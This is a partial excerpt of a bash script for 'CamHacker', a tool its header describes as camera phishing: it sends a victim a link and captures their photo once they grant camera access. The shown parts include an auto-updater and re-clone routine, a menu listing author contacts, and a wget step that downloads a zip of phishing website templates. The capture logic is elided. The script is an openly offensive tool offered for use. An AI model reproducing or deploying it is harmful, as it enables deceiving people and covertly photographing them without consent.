...
# CamHacker
# Version    : 1.5
# Description: Cam_Hack is a camera Phishing tool, Which Send a phishing link to the victim, if they gives access to camera, Then their photo will be captured!
# Author     : flyingcluprit
# Github     : https://github.com/flyingculprit
...
if [[ -z $UPDATE ]]; then
    ...
    if [[ $UPDATE == true ]]; then
        git_ver=`curl -s -N https://raw.githubusercontent.com/flyingculprit/CamHacker/main/files/version.txt`
    else
        git_ver=$version
    fi
fi
...
if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
    changelog=$(curl -s -N https://raw.githubusercontent.com/flyingculprit/CamHacker/main/files/changelog.log)
    clear
    echo -e "$logo"
    echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        ...
        printf "$nc"
        if [[ "$upask" == "y" ]]; then
            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/flyingculprit/CamHacker
...
# Select template
    if echo $option | grep -q "1"; then
        ...
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[Cam_Hack]
$red[Version]    ${cyan} :[${version}]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[flyingculprit]
$red[Github]     ${cyan} :[https://github.com/flyingculprit]
$red[Messenger]  ${cyan} :[https://m.me/flyingculprit]
$red[Email]      ${cyan} :[suryan2021ai@gmail.com]"
        printf "$ch_prompt"
        read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/flyingculprit/zpisher"
...
if ! [ -d sites ]; then
    mkdir sites
    netcheck
    wget -q --show-progress "https://github.com/flyingculprit/Cam_Hack/releases/latest/download/websites.zip"
